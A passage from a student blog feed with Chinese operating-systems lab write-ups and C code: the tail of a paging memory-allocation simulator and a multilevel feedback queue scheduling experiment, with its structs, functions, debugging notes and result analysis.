class="line">temp = head;</span><br><span class="line">temp1 = head-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID == id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;temp-&gt;Pages;i++)</span><br><span class="line">&#123;</span><br><span class="line">BLOCK[temp-&gt;Page[i]] = <span class="number">0</span>;</span><br><span class="line">BlankBlockNum++;</span><br><span class="line">&#125;</span><br><span class="line">head = temp1;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line">green_printf(<span class="string">&quot;Memory release successful!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(temp1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp1-&gt;ID == id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;temp1-&gt;Pages;i++)</span><br><span class="line">&#123;</span><br><span class="line">BLOCK[temp1-&gt;Page[i]] = <span class="number">0</span>;</span><br><span class="line">BlankBlockNum++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">green_printf(<span class="string">&quot;Memory release successful!\n&quot;</span>);</span><br><span class="line">temp-&gt;next = temp1-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(temp1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">temp = temp1;</span><br><span class="line">temp1=temp1-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(temp1==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;The process does not exist!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">showMemory();</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">AddressTranslation</span><span class="params">(<span class="type">int</span> id,<span class="type">int</span> LogAddress)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> PhyAddress,P,W;</span><br><span class="line">Process *temp;</span><br><span class="line">temp = head;</span><br><span class="line"><span class="keyword">while</span>(temp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID == id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(LogAddress &gt; temp-&gt;Size)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;Break out of bounds!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//物理地址=页号*块大小(4K)+偏移量(逻辑地址)</span></span><br><span class="line">P = LogAddress / SIZE;</span><br><span class="line">W = LogAddress % SIZE;</span><br><span class="line">PhyAddress = temp-&gt;Page[P]*SIZE+W;</span><br><span class="line">purple_printf(<span class="string">&quot;Calculator: PhyAddress=%d×4K+%d\n&quot;</span>,temp-&gt;Page[P],W);</span><br><span class="line">yellow_printf(<span class="string">&quot;PhyAddress:%d\n&quot;</span>,PhyAddress);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(temp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;The process does not exist!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showBlocks</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">Process *temp;</span><br><span class="line">temp=head;</span><br><span class="line"><span class="keyword">while</span> (temp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">count+=temp-&gt;Pages;</span><br><span class="line">temp=temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">darkgreen_printf(<span class="string">&quot;Free Blocks:%d\n&quot;</span>,COUNT-count);</span><br><span class="line">purple_printf(<span class="string">&quot;Occupy Blocks:%d\n&quot;</span>,count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">yellow_printf(<span class="string">&quot;Welcome!\n&quot;</span>);</span><br><span class="line">InitProcess(); <span class="comment">//初始化进程并分配内存</span></span><br><span class="line">green_printf(<span class="string">&quot;\nGot it!\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> n,id,LogAddress;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter the sequence number of the operation you want to perform:\n1.Free up memory\n2.Allocate memory\n3.View physical address\n4.View free blocks\n5.View memory allocation\n6.Exit\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">switch</span>(n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter the ID of the process you want to release:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;id);</span><br><span class="line">Release(id);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the process ID and logical address:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;id,&amp;LogAddress);</span><br><span class="line">AddressTranslation(id,LogAddress);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">showBlocks();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">showMemory();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">yellow_printf(<span class="string">&quot;Have a nice day!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">red_printf(<span class="string">&quot;Error!Without this choice!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计操 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程调度算法：多级反馈队列调度</title>
      <link href="/posts/19c408c.html"/>
      <url>/posts/19c408c.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/26/658a532cca506.jpg</cover>
      <date>Sun Nov 12 2023 10:59:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h1 id="实验一：多级反馈队列调度算法"><a href="#实验一：多级反馈队列调度算法" class="headerlink" title="实验一：多级反馈队列调度算法"></a>实验一：多级反馈队列调度算法</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过模拟多级反馈队列进程调度算法，加深对进程调度算法、分时系统、时间片、进程优先级、进程状态、进程控制的理解。</p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>用C语言或Python编写一个程序，模拟多级反馈队列调度算法的执行过程，要求：</p><ol><li><p>队列4级，每一级的队列长度都为 10，第一级的时间片为 T，第二级的时间片为 2T，第三级的时间片为4T，第四级的时间片为 8T；（T的大小自己定）</p></li><li><p>立即抢占的调度算法；</p></li><li><p>要有：在调度n级（n&gt;1）队列时，有新来的进程进入系统。</p></li></ol><h2 id="程序流程图"><a href="#程序流程图" class="headerlink" title="程序流程图"></a>程序流程图</h2><p><img src="https://s11.ax1x.com/2023/12/18/piI8UP0.png" alt="流程图"></p><h2 id="程序代码"><a href="#程序代码" class="headerlink" title="程序代码"></a>程序代码</h2><p>本次使用了C语言进行程序编写，开发环境：Ubuntu 20.04，主要代码如下：</p><h3 id="结构体与变量"><a href="#结构体与变量" class="headerlink" title="结构体与变量"></a>结构体与变量</h3><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> ArrivalTime; <span class="comment">// 到达时间</span></span><br><span class="line"><span class="type">int</span> WorkTime; <span class="comment">// 服务时间</span></span><br><span class="line"><span class="type">int</span> number; <span class="comment">// 到达顺序</span></span><br><span class="line"><span class="type">int</span> flag; <span class="comment">// 0等待，1运行完成</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Process;</span><br></pre></td></tr></table></figure><h4 id="多级队列"><a href="#多级队列" class="headerlink" title="多级队列"></a>多级队列</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QueueList</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> TimeSlice;<span class="comment">// 时间片</span></span><br><span class="line"><span class="type">int</span> length;<span class="comment">// 队列长度</span></span><br><span class="line">Process *front;<span class="comment">// 队列第一个进程指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QueueList</span> *<span class="title">next</span>;</span> <span class="comment">// 下一个队列</span></span><br><span class="line">&#125; Queue;</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Queue *head = <span class="literal">NULL</span>; <span class="comment">// 多级队列头节点</span></span><br><span class="line">Queue *QLists[<span class="number">50</span>]; <span class="comment">// 多级队列</span></span><br><span class="line">Process *Finish = <span class="literal">NULL</span>; <span class="comment">// 已完成</span></span><br><span class="line"><span class="type">int</span> time = <span class="number">0</span>; <span class="comment">// 运行时间</span></span><br><span class="line"><span class="type">int</span> Maxsize = <span class="number">4</span>; <span class="comment">// 队列级数</span></span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="初始化队列"><a href="#初始化队列" class="headerlink" title="初始化队列"></a>初始化队列</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">yellow_printf(<span class="string">&quot;Welcome!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number of queue progressions:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;Maxsize);</span><br><span class="line">Queue *temp;</span><br><span class="line"><span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; Maxsize; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = (Queue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Queue));</span><br><span class="line">temp-&gt;front = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;TimeSlice=T;</span><br><span class="line">count *= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;TimeSlice = T*count; <span class="comment">// 设置各级队列时间片，当前时间片T，2T，4T，8T...</span></span><br><span class="line">count*=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;length = <span class="number">10</span>; <span class="comment">// 限制队列过长，以免出现饥饿问题</span></span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">head = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Queue *temp2;</span><br><span class="line">temp2 = head;</span><br><span class="line"><span class="keyword">while</span> (temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="初始化进程"><a href="#初始化进程" class="headerlink" title="初始化进程"></a>初始化进程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitProcess</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number of processes:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"><span class="keyword">while</span> (num &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;Exceed the queue length!\n&quot;</span>);</span><br><span class="line">yellow_printf(<span class="string">&quot;Please re-energize ...\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">&#125;</span><br><span class="line">Process *temp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = (Process *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Process));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Arrival and run time of the %d process:\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;temp-&gt;ArrivalTime, &amp;temp-&gt;WorkTime);</span><br><span class="line">temp-&gt;flag = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;number = i + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (head-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">head-&gt;front = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp2;</span><br><span class="line">temp2 = head-&gt;front;</span><br><span class="line"><span class="keyword">while</span> (temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SortProcess</span><span class="params">()</span>; <span class="comment">// 按到达时间排序</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RunFirstProcess</span><span class="params">(Queue *Q)</span>； <span class="comment">// 运行 Q 队列的首进程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert2NextQueue</span><span class="params">(Process *P, Queue *Q)</span>； <span class="comment">// 将进程 P 插入 Q 队尾</span></span><br></pre></td></tr></table></figure><h4 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MLFQ</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">QLists[<span class="number">1</span>] = head;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= Maxsize; i++)</span><br><span class="line">&#123;</span><br><span class="line">QLists[i] = QLists[i - <span class="number">1</span>]-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保证结束的时刻</span></span><br><span class="line"><span class="keyword">if</span> (QLists[<span class="number">1</span>]-&gt;front != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">time = QLists[<span class="number">1</span>]-&gt;front-&gt;ArrivalTime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 定义一个标志变量，表示是否有进程运行，0表示没有进程运行</span></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= Maxsize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 检查每个队列的第一个进程是否满足运行条件</span></span><br><span class="line"><span class="keyword">if</span> (QLists[i]-&gt;front != <span class="literal">NULL</span> &amp;&amp; time &gt;= QLists[i]-&gt;front-&gt;ArrivalTime)</span><br><span class="line">&#123;</span><br><span class="line">RunFirstProcess(QLists[i]);</span><br><span class="line"><span class="comment">// 将标志变量设为1，表示有进程运行</span></span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果标志变量为0，表示没有进程运行</span></span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j &lt;= Maxsize;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(QLists[j]-&gt;front != <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断是否所有进程都运行完毕</span></span><br><span class="line"><span class="keyword">if</span> (j==Maxsize+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">green_printf(<span class="string">&quot;\nAll processes have finished running&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果不是，就增加时间并继续循环</span></span><br><span class="line">time++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><h4 id="代码创新点"><a href="#代码创新点" class="headerlink" title="代码创新点"></a>代码创新点</h4><ol><li>该程序可自定义队列级数，本实验为四级队列</li><li>程序输出字体颜色根据提示信息有所不同</li></ol><p><img src="https://s11.ax1x.com/2023/12/18/piI8d2T.png" alt="运行结果"></p><h2 id="规范性输入"><a href="#规范性输入" class="headerlink" title="规范性输入"></a>规范性输入</h2><p>本实验要求每一级队列长度为 10</p><p><img src="https://s11.ax1x.com/2023/12/18/piI8aGV.png" alt="规范性"></p><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题 1"></a>问题 1</h4><p>首次编写程序时，未考虑进程到达时间的先后，即进程 1 的到达时间大于进程 2 的情况，导致运行结果出错</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案 1"></a>解决方案 1</h4><p>在进入调度函数之前，依据进程到达时间进行一次快排</p><h4 id="问题-2"><a href="#问题-2" class="headerlink" title="问题 2"></a>问题 2</h4><p>当进程 1 运行结束，但进程 2 还未到达时，在主循环中没有更新运行时刻，导致运行结果出错</p><h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案 2"></a>解决方案 2</h4><p>主循环添加时刻 Time 的自增</p><h2 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h2><p>上文中的测试用例为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">进程号    到达时间运行时间</span><br><span class="line">  1 1   22</span><br><span class="line">  244   3</span><br><span class="line">  332             44</span><br><span class="line">  411   5</span><br><span class="line">  523   13</span><br></pre></td></tr></table></figure><p>四级队列时间片分别为 1，2，4，8</p><ol><li>进程 1 最先到达，运行 1 个时间片后，没有进程到达，进入二级队列继续运行……</li><li>直到进程 4 在 T &#x3D; 11时到达，进程 1 被抢占（此时进程 1 位于四级队列）</li><li>直到进程 2 运行完毕且上级队列无进程需要运行时，运行进程 1</li><li>……</li></ol><p>最终运行结果如上图，计算可得结果正确</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span 